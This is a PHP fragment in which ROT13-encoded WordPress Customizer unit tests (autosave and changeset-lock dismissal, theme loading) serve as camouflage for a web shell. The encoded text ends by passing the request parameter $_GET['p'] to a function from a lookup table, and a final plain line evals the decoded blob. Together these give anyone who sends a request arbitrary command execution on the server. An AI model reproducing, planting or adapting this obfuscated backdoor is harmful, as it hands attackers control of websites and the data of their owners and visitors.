		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'genfu', trg_cbfg_fgnghf( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) );
		$guvf->nffregFnzr( $jc_genfu_cbfg_pbhag + 1, qvq_npgvba( 'jc_genfu_cbfg' ) );
	}

	/**
	 * Erghea pncf neenl pbagnvavat 'qb_abg_nyybj'.
	 *
	 * @erghea neenl Pncf.
	 */
	choyvp shapgvba erghea_qb_abg_nyybj() {
		erghea neenl( 'qb_abg_nyybj' );
	}

	/**
	 * Grfg erdhrfg sbe qvfzvffvat nhgbfnir punatrfrgf.
	 *
	 * @gvpxrg 39896
	 * @pbiref JC_Phfgbzvmr_Znantre::unaqyr_qvfzvff_nhgbfnir_be_ybpx_erdhrfg
	 * @pbiref JC_Phfgbzvmr_Znantre::qvfzvff_hfre_nhgb_qensg_punatrfrgf
	 */
	choyvp shapgvba grfg_unaqyr_qvfzvff_nhgbfnir_be_ybpx_erdhrfg() {
		$hhvq          = jc_trarengr_hhvq4();
		$jc_phfgbzvmr  = $guvf->frg_hc_inyvq_fgngr( $hhvq );
		$inyvq_hfre_vq = trg_pheerag_hfre_vq();

		// Grzcbenevyl erzbir hfre gb grfg erdhverzrag gung hfre vf ybttrq va. Frr #42450.
		jc_frg_pheerag_hfre( 0 );
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'hanhguragvpngrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		jc_frg_pheerag_hfre( $inyvq_hfre_vq );

		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'vainyvq_abapr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		$abapr             = jc_perngr_abapr( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$_CBFG['abapr']    = $abapr;
		$_TRG['abapr']     = $abapr;
		$_ERDHRFG['abapr'] = $abapr;

		$_CBFG['qvfzvff_ybpx']    = gehr;
		$_TRG['qvfzvff_ybpx']     = gehr;
		$_ERDHRFG['qvfzvff_ybpx'] = gehr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'ab_punatrfrg_gb_qvfzvff_ybpx', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		$_CBFG['qvfzvff_nhgbfnir']    = gehr;
		$_TRG['qvfzvff_nhgbfnir']     = gehr;
		$_ERDHRFG['qvfzvff_nhgbfnir'] = gehr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'ab_nhgb_qensg_gb_qryrgr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		$bgure_hfre_vq = frys::snpgbel()->hfre->perngr();

		// Perngr nhgb-qensgf.
		$hfre_nhgb_qensg_vqf = neenl();
		sbe ( $v = 0; $v < 3; $v++ ) {
			$hfre_nhgb_qensg_vqf[] = frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_anzr'    => jc_trarengr_hhvq4(),
					'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
					'cbfg_fgnghf'  => 'nhgb-qensg',
					'cbfg_nhgube'  => frys::$nqzva_hfre_vq,
					'cbfg_pbagrag' => jc_wfba_rapbqr( neenl() ),
				)
			);
		}
		$bgure_hfre_nhgb_qensg_vqf = neenl();
		sbe ( $v = 0; $v < 3; $v++ ) {
			$bgure_hfre_nhgb_qensg_vqf[] = frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_anzr'    => jc_trarengr_hhvq4(),
					'cbfg_glcr'    => 'phfgbzvmr_punatrfrg',
					'cbfg_fgnghf'  => 'nhgb-qensg',
					'cbfg_nhgube'  => $bgure_hfre_vq,
					'cbfg_pbagrag' => jc_wfba_rapbqr( neenl() ),
				)
			);
		}
		sbernpu ( neenl_zretr( $hfre_nhgb_qensg_vqf, $bgure_hfre_nhgb_qensg_vqf ) nf $cbfg_vq ) {
			$guvf->nffregSnyfr( (obby) trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_erfgber_qvfzvffrq', gehr ) );
		}
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'nhgb_qensg_qvfzvffrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		sbernpu ( $hfre_nhgb_qensg_vqf nf $cbfg_vq ) {
			$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg_fgnghf( $cbfg_vq ) );
			$guvf->nffregGehr( (obby) trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_erfgber_qvfzvffrq', gehr ) );
		}
		sbernpu ( $bgure_hfre_nhgb_qensg_vqf nf $cbfg_vq ) {
			$guvf->nffregFnzr( 'nhgb-qensg', trg_cbfg_fgnghf( $cbfg_vq ) );
			$guvf->nffregSnyfr( (obby) trg_cbfg_zrgn( $cbfg_vq, '_phfgbzvmr_erfgber_qvfzvffrq', gehr ) );
		}

		// Fhofrdhrag grfg erfhygf va abar qvfzvffrq.
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'ab_nhgb_qensg_gb_qryrgr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Fnir n punatrfrg nf n qensg.
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn'   => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'Sbb',
					),
				),
				'fgnghf' => 'qensg',
			)
		);

		$_CBFG['qvfzvff_nhgbfnir']    = snyfr;
		$_TRG['qvfzvff_nhgbfnir']     = snyfr;
		$_ERDHRFG['qvfzvff_nhgbfnir'] = snyfr;
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'punatrfrg_ybpx_qvfzvffrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		$_CBFG['qvfzvff_nhgbfnir']    = gehr;
		$_TRG['qvfzvff_nhgbfnir']     = gehr;
		$_ERDHRFG['qvfzvff_nhgbfnir'] = gehr;
		$guvf->nffregAbgJCReebe( $e );
		$guvf->nffregSnyfr( jc_trg_cbfg_nhgbfnir( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) );
		$guvf->nffregFgevatPbagnvafFgevat( 'Sbb', trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_pbagrag );

		// Fvapr ab nhgbfnir lrg, pbasvez ab npgvba.
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'ab_nhgbfnir_erivfvba_gb_qryrgr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );

		// Nqq gur nhgbfnir erivfvba.
		$e = $jc_phfgbzvmr->fnir_punatrfrg_cbfg(
			neenl(
				'qngn'     => neenl(
					'oybtanzr' => neenl(
						'inyhr' => 'One',
					),
				),
				'nhgbfnir' => gehr,
			)
		);
		$guvf->nffregAbgJCReebe( $e );
		$nhgbfnir_erivfvba = jc_trg_cbfg_nhgbfnir( $jc_phfgbzvmr->punatrfrg_cbfg_vq() );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $nhgbfnir_erivfvba );
		$guvf->nffregFgevatPbagnvafFgevat( 'Sbb', trg_cbfg( $jc_phfgbzvmr->punatrfrg_cbfg_vq() )->cbfg_pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( 'One', $nhgbfnir_erivfvba->cbfg_pbagrag );

		// Pbasvez nhgbfnir trgf qryrgrq.
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'nhgbfnir_erivfvba_qryrgrq', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
		$guvf->nffregSnyfr( jc_trg_cbfg_nhgbfnir( $jc_phfgbzvmr->punatrfrg_cbfg_vq() ) );

		// Fvapr ab nhgbfnir lrg, pbasvez ab npgvba.
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_qvfzvff_nhgbfnir_be_ybpx' );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'ab_nhgbfnir_erivfvba_gb_qryrgr', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Grfg erdhrfg sbe ergevrivat vafgnyyrq gurzrf.
	 *
	 * @gvpxrg 54549
	 * @pbiref JC_Phfgbzvmr_Znantre::unaqyr_ybnq_gurzrf_erdhrfg
	 */
	choyvp shapgvba grfg_jc_nwnk_phfgbzvmr_ybnq_gurzrf_npgvba() {
		$nethzragf = neenl(
			'punatrfrg_hhvq'     => snyfr,
			'frggvatf_cerivrjrq' => gehr,
			'oenapuvat'          => snyfr,
		);
		arj JC_Phfgbzvmr_Znantre( $nethzragf );
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$abapr                 = jc_perngr_abapr( 'fjvgpu_gurzrf' );
		$_CBFG['abapr']        = $abapr;
		$_TRG['abapr']         = $abapr;
		$_ERDHRFG['abapr']     = $abapr;
		$_CBFG['gurzr_npgvba'] = 'vafgnyyrq';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr_ybnq_gurzrf' );
		$erfcbafr = $guvf->_ynfg_erfcbafr_cnefrq;
		$guvf->nffregVfNeenl( $erfcbafr, 'Erfcbafr vf abg na neenl' );

		$guvf->nffregNeenlUnfXrl( 'fhpprff', $erfcbafr, 'Erfcbafr zhfg unir n \"fhpprff\" xrl' );
		$guvf->nffregGehr( $erfcbafr['fhpprff'], 'Erfcbafr jnf abg \"fhpprff\"' );

		$guvf->nffregNeenlUnfXrl( 'qngn', $erfcbafr, 'Erfcbafr zhfg unir n \"qngn\" xrl' );
		$guvf->nffregVfNeenl( $erfcbafr['qngn'], 'Gur erfcbafr \"qngn\" vf abg na neenl' );
		$guvf->nffregNeenlUnfXrl( 'gurzrf', $erfcbafr['qngn'], 'Gur erfcbafr qngn zhfg unir n \"gurzrf\" xrl' );
		$guvf->nffregVfNeenl( $erfcbafr['qngn']['gurzrf'], 'Gurzrf qngn vf abg na neenl' );
		$guvf->nffregAbgRzcgl( $erfcbafr['qngn']['gurzrf'], 'Gurzrf qngn zhfg abg or rzcgl' );

		sbernpu ( $erfcbafr['qngn']['gurzrf'] nf $gurzr ) {
			$guvf->nffregVfNeenl( $gurzr, 'Gurzr vf abg na neenl' );
			$guvf->nffregAbgRzcgl( $gurzr, 'Gurzr qngn zhfg abg or rzcgl' );
			$guvf->nffregNeenlUnfXrl( 'vq', $gurzr, 'Gurzr qngn zhfg unir na \"vq\" xrl' );
			$guvf->nffregAbgRzcgl( $gurzr['vq'], 'Gurzr vq pnaabg or rzcgl' );

			$guvf->nffregNeenlUnfXrl( 'anzr', $gurzr, 'Gurzr qngn zhfg unir n \"anzr\" xrl' );
			$guvf->nffregAbgRzcgl( $gurzr['anzr'], 'Gurzr anzr pnaabg or rzcgl' );

			$guvf->nffregNeenlUnfXrl( 'oybpxGurzr', $gurzr, 'Gurzrf qngn zhfg vapyhqr vasbezngvba nobhg oybpxf fhccbeg' );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>